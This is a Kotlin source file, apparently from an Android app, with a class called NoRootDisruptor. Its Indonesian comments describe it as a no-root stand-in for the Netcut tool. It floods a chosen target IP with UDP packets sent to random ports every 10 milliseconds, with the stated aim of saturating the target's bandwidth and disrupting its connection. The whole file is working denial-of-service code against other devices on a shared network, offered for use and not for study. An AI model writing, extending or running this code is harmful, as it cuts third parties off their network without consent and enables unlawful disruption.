package com.example.wifitracer

import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class NoRootDisruptor {

    private val executor: ScheduledExecutorService = Executors.newScheduledThreadPool(5)
    private val activeTasks = mutableMapOf<String, Boolean>()

    /**
     * Metode ini mensimulasikan "Netcut" tanpa Root dengan melakukan UDP Flooding ke target.
     * Ini tidak benar-benar memutus koneksi di tingkat ARP (seperti Netcut asli),
     * tetapi memenuhi bandwidth/port target sehingga koneksinya menjadi sangat lambat atau terganggu.
     */
    fun startDisruption(targetIp: String) {
        if (activeTasks[targetIp] == true) return
        activeTasks[targetIp] = true

        val targetAddress = InetAddress.getByName(targetIp)
        val buffer = ByteArray(1024) // 1KB packet
        
        // Kirim paket UDP secara terus menerus ke berbagai port
        executor.scheduleAtFixedRate({
            if (activeTasks[targetIp] == true) {
                try {
                    val socket = DatagramSocket()
                    val port = (1..65535).random()
                    val packet = DatagramPacket(buffer, buffer.size, targetAddress, port)
                    socket.send(packet)
                    socket.close()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }, 0, 10, TimeUnit.MILLISECONDS) // Interval sangat cepat untuk saturasi
    }

    fun stopDisruption(targetIp: String) {
        activeTasks[targetIp] = false
    }
}
